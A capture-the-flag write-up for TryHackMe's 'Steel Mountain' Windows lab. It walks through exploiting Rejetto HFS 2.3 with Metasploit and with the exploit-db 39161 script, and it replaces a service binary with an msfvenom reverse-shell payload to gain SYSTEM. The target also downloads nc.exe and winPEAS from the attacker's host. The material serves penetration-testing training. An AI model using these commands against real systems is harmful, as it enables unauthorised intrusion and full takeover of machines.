---
title: Writeup for TryHackMe room - Steel Mountain
author: 4n3i5v74
date: 2021-03-24 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, windows, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Steel Mountain](https://tryhackme.com/room/steelmountain){:target="_blank"}

This room contains detailed info about `rejetto` http vulnerability exploitation and privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}.


## Tools Used

### Enumeration

- NMAP

### Exploitation

- Msfconsole
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1){:target="_blank"}
- Msfvenom
- Netcat
- [Rejetto HTTP File Server RCE script](https://www.exploit-db.com/exploits/39161){:target="_blank"}
- [Netcat for windows](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe){:target="_blank"}
- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe){:target="_blank"}


## Task 1 - Introduction

### References
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to enumerate the target machine using `nmap -PN -T4 -sS --top-ports 1000 -A <ip>`

The output will be similar to
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-27 04:18 BST
Nmap scan report for <hostname> (<ip>)
Host is up (0.00062s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings:
|   TLSSessionReq:
|     steelmountain0
|     210426031434Z
|     211026031434Z0
|     steelmountain0
|     <JLg
|     u3ox
|     $0"0
|     \x8e
|     o-5u
|_    Q>)@C
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2021-04-26T03:14:34
|_Not valid after:  2021-10-26T03:14:34
|_ssl-date: 2021-04-27T03:20:26+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49163/tcp open  msrpc        Microsoft Windows RPC

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=4/27%Time=608782BE%P=x86_64-pc-linux-gnu%r(TL
SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03'\x87\x82\xb9h@\xf6Q
SF:\x8cf\xd6\xd1\x7f\xfa\x10X\xbb\x83x\xf9\xff1\x8b\xe9m\x8b\xa2\xa5\x1d\x
SF:b3\x05\xa0\x20\xa7\x1e\0\0\x1bDt}\x1e\xf5W\xb9\xcc\x03\xb7\xd0\?\x1fq9\
SF:xaa\xb3\xa7\x9d\x83\xb5\x05\xc7\xbd\xef\xc6Z\0/\0\0\x05\xff\x01\0\x01\0
SF:\x0b\0\x02\xe8\0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x0
SF:2\x01\x02\x02\x10iV\xa9x\xf6\x8bc\xacF\x81\xde\x06\xebp\x01\xa60\r\x06\
SF:t\*\x86H\x86\xf7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\
SF:x13\rsteelmountain0\x1e\x17\r210426031434Z\x17\r211026031434Z0\x181\x16
SF:0\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x8
SF:6\xf7\r\x01\x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x0
SF:1\0\xac\x10\xff\x1ba5C\x93\x12\xd4\x86\xc1/\xf4\^6\x19M\x8b\xf5\x9e\xb5
SF:u\x06\x85\xc2i\xf5C\xeb\x0e<JLg\xbb\xda\xec9\x20\xabu3ox\xea\xd3\|\xa4\
SF:x92\r\xc6j\x03\xe6\xccG\xf5z\xf7oW5\x0b\xf5\x18\xe1Pfs\x89c\xeacfY\xfdC
SF:\xb8\xc1\x90\xe7\x90M#\x06\xea\x1f\x94\x07\x9c\xe1Y\xcdT\x85\x96_\x99\x
SF:dd\x9b\xdei\xb0\x18g;\xa6tQ\xba\"X!\xe1\xe0\xb67l\xdf\0\xef\xdf#\x02\x0
SF:1M\xb9\xda\x83\xfe\x94\x14r\xc5#\xff\xb6\xe3\x91\xf4\xc2\x19's\xbc~\xd2
SF:\xcet\xb2\xa7\xa4\+c\x10\xaas\x0b\xa2\x91\.\x96\xa1\x1dp\x1f\x1c\x05\x8
SF:3\xaa\+7\xd8\xfa#\xf04\xae\xe6A\x9a\xba\x9f\x9e\xce\xfa\x17:p\x90\"\xf7
SF:V\xb6l\0\xdc\xc1/\xa4\(z\xe37b\x94n\xc3l\xdb\x1b\xc4\"\xaa\xc1SJ\xdf-\x
SF:fb\x17Kl\xb0W\x96\xa8\xf0\xde\x18/Xk\x8f\xb3\xf3\x16\x84\xe69\x8c\xda\x
SF:a0=\xf8>\x8e\x96\x11L/\xf1UG\xb9\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x0
SF:3U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\
SF:x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\
SF:0\x03\x82\x01\x01\0\$\x92\x92\x962\xd1c\x08/l\x0b\xe8p\xa3\x89\xfc\xad\
SF:x15}\xaa\x0c\xe0\xec\xf3\xaa\x82\x85\x0b\x80o\xfe2\x89I\xe5\xbb\x1a\xe4
SF:\xd4{D:\xdc2\xcf\xab\nGiL\xd9\x96\xf5\$U\xe2\x84@\xc9\x03\xb6\xf3\xc2\x
SF:8a\xf47%L\x97g\x8b\x0bmz\xadF\x05\x91\xaf\x17\xbf\xc2\xdb\x14\xe8TEd\x1
SF:3\x83\0/\?\xcf\]\xfbs\?\xb8\xd0X\xb0U'\x1b\xc0\xc2\x87\xbe{\x1c\x1df\xd
SF:5\xf5\xe6\xcf\xa6\xb1\"\x19\x10\xa5\x11\nuD\xe3\x99\\\x8e\xff\r&@\x97\x
SF:f8o-5u\xa0\x8fOV\xd2\x17\x07\x07\xe8\x20\xee\x8c\x99\x9c\x91Q>\)@C\x91\
SF:xc1I1\^\x1c\xa1_/\xf4\x0e\x81D\xd7zW\x9d\xe1\^\x9b\xc04\x04J\xed\xb4\xd
SF:dW'P\xfc\xce\x93\xff\xca\xaeu\xf4\x8e\x19\xbf\xcdy>\xec\x10N#\x03\xa0\x
SF:1f\xd71\xfd\x87\xe3\)mk\x85\xce,\xa7h>M\xe1<\xa8\n\xf9-j\xf7\xc4@\xe9cc
SF:\xd0s\x8d\xcd\x13\xe1\xd3_\xe5\xc2q\xb6\xbd\xd7\xc6\xa5\x0e\0\0\0");

MAC Address: 02:9C:5A:A0:F7:B9 (Unknown)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/27%OT=80%CT=1%CU=40904%PV=Y%DS=1%DC=D%G=Y%M=029C5A%T
OS:M=60878300%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10F%TI=I%CI=I%TS=7
OS:)SEQ(SP=100%GCD=1%ISR=10F%TI=I%CI=RD%II=I%SS=S%TS=7)OPS(O1=M2301NW8ST11%
OS:O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301NW8ST11%O5=M2301NW8ST11%O6=M230
OS:1ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T
OS:=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:9c:5a:a0:f7:b9 (unknown)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-27 04:20:26
|_  start_date: 2021-04-27 04:14:25

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms <hostname> (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.93 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` and load url `http://<ip>`. Right click on the page and use `View image info`, which will display image source and name as `http://<ip>/img/<name>.png`.


## Task 2 - Initial Access

### References
- [Rejetto HFS](http://www.rejetto.com/hfs/){:target="_blank"}
- [Rejetto HFS exploit](https://www.exploit-db.com/exploits/34926){:target="_blank"}


Use `firefox` to load the url `http://<ip>:8080` to get any info on the website source. The link to `HttpFileServer 2.3` directs to the [Rejetto HFS](http://www.rejetto.com/hfs/){:target="_blank"}

Use `searchsploit` to check if there are any exploits available for `rejetto 2` involving `metasploit`.
{% capture code %}{% raw %}searchsploit "rejetto 2"{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}-------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)    | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities         | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload            | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)       | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)       | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution  | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)               | windows/webapps/49125.py
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfconsole -q` to load the `rejetto` module and load the variables.
{% capture code %}{% raw %}msf5 > search rejetto

Matching Modules

#  Name                                   Disclosure Date  Rank       Check  Description
-  ----                                   ---------------  ----       -----  -----------
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
HTTPDELAY  10               no        Seconds to wait before terminating web server
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      80               yes       The target port (TCP)
SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT    8080             yes       The local port to listen on.
SSL        false            no        Negotiate SSL/TLS for outgoing connections
SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
TARGETURI  /                yes       The path of the web application
URIPATH                     no        The URI to use for this exploit (default is random)
VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST     <source-ip>     yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS <target-ip>
RHOSTS => <target-ip>

msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

Exploit to spawn `meterpreter` shell and get system info and flag.
{% capture code %}{% raw %}msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on <source-ip>:4444
[*] Using URL: http://0.0.0.0:8080/AgvBfPcusrk
[*] Local IP: http://<source-ip>:8080/AgvBfPcusrk
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /AgvBfPcusrk
[*] Sending stage (176195 bytes) to <target-ip>
[*] Meterpreter session 1 opened (<source-ip>:4444 -> <target-ip>:49231) at 2021-04-27 04:42:14 +0100
[!] Tried to delete %TEMP%\JatBAp.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
meterpreter > shell
Process 2500 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>type C:\Users\bill\Desktop\user.txt
type C:\Users\bill\Desktop\user.txt
b04763b6fcf51fcd7c13abc7db4fd365

c:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>exit
exit{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Privilege Escalation

### References
- [PowerUp Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Download the `PowerUp.ps1` script using `wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1`.

From the existing `meterpreter` shell in `msfconsole -q`, upload the `PowerUp.ps1` script and `source` the `functions` in them.
{% capture code %}{% raw %}meterpreter > upload /root/PowerUp.ps1
[*] uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.51 KiB of 586.51 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /root/PowerUp.ps1 -> PowerUp.ps1

meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > powershell_shell

PS > pwd

Path
C:\users\bill\desktop

PS > . .\PowerUp.ps1{% endraw %}{% endcapture %} {% include code.html code=code %}

Execute the `invoke-allchecks` cmdlet.
{% capture code %}{% raw %}PS > invoke-allchecks

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files


PS > get-service | where { $_.name -like 'Advanced*' } | ft -auto

Status  Name                       DisplayName
------  ----                       -----------
Running AdvancedSystemCareService9 Advanced SystemCare Service 9{% endraw %}{% endcapture %} {% include code.html code=code %}

The service `AdvancedSystemCareService9` has `CanRestart` enabled and also is vulnerable to `Unquoted Service Paths`. Use `msfvenom` to create a `reverse shell` payload to masquerade as executable `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` within the OS.
{% capture code %}{% raw %}msfvenom -p windows/shell_reverse_tcp LHOST=<source-ip> LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `meterpreter` shell in `msfconsole -q`, upload the `reverse shell` payload.
{% capture code %}{% raw %}meterpreter > upload /root/ASCService.exe
[*] uploading  : /root/ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/ASCService.exe -> ASCService.exe
[*] uploaded   : /root/ASCService.exe -> ASCService.exe

meterpreter > powershell_shell
PS > stop-service AdvancedSystemCareService9

copy "c:\users\bill\desktop\ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `netcat` listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 4443{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 4443){% endraw %}{% endcapture %} {% include code.html code=code %}

From the `msfconsole -q` shell, start the exploited shell to spawn `privilege shell`.
{% capture code %}{% raw %}PS > start-service AdvancedSystemCareService9{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the `netcat` listener for connection, and get the flag.
{% capture code %}{% raw %}Connection from <target-ip> 49287 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ../..
cd ../..

C:\>dir /s /p root.txt
dir /s /p root.txt
Volume in drive C has no label.
Volume Serial Number is 2E4A-906A

Directory of C:\Users\Administrator\Desktop

09/27/2019  05:41 AM                32 root.txt
            1 File(s)             32 bytes

    Total Files Listed:
            1 File(s)             32 bytes
            0 Dir(s)  44,153,417,728 bytes free

C:\>more "C:\Users\Administrator\Desktop\root.txt"
more "C:\Users\Administrator\Desktop\root.txt"
<flag>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 4 - Access and Escalation Without Metasploit

### References
- [Rejetto HTTP File Server RCE script](https://www.exploit-db.com/exploits/39161){:target="_blank"}
- [Netcat for windows](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe){:target="_blank"}
- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe){:target="_blank"}


Download the `Rejetto HTTP File Server RCE script`, `Netcat for windows` and `WinPEAS` scripts.
{% capture code %}{% raw %}wget https://www.exploit-db.com/exploits/39161
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Start a `python web server`.
{% capture code %}{% raw %}python3 -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:80/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `netcat` listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 4443{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 4443){% endraw %}{% endcapture %} {% include code.html code=code %}

Edit the downloaded exploit script `39161.py` to update `ip_addr` and `local_port`. Update the variable `vbs` with `remote port` and `netcat` binary name.
{% capture code %}{% raw %}ip_addr = "<source-ip>"      #local IP address
local_port = "4443"      # Local Port number
vbs = ip_addr+":8080%2Fnc.exe"      # add port{% endraw %}{% endcapture %} {% include code.html code=code %}

Run the python script `39161.py` to exploit, download the `netcat for windows` binary in target, and spawn a reverse shell.
{% capture code %}{% raw %}python3 -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}<target-ip> - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
<target-ip> - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
<target-ip> - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
<target-ip> - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -{% endraw %}{% endcapture %} {% include code.html code=code %}

There will be a `reverse shell` spawned at the `netcat` listener.
{% capture code %}{% raw %}Connection from <target-ip> 49346 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> powershell -c wget "http://<source-ip>:8080/winPEASx64.exe" -outfile "winPEASx64.exe"
powershell -c wget "http://<source-ip>:8080/winPEASx64.exe" -outfile "winPEASx64.exe"

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> winPEASx64.exe cmd > output.txt
winPEASx64.exe cmd > output.txt

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> more output.txt
more output.txt
========================================(Services Information)========================================
[+] Interesting Services -non Microsoft-
[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto- Running - No quotes and Space detected
File Permissions: bill [WriteData/CreateFiles]
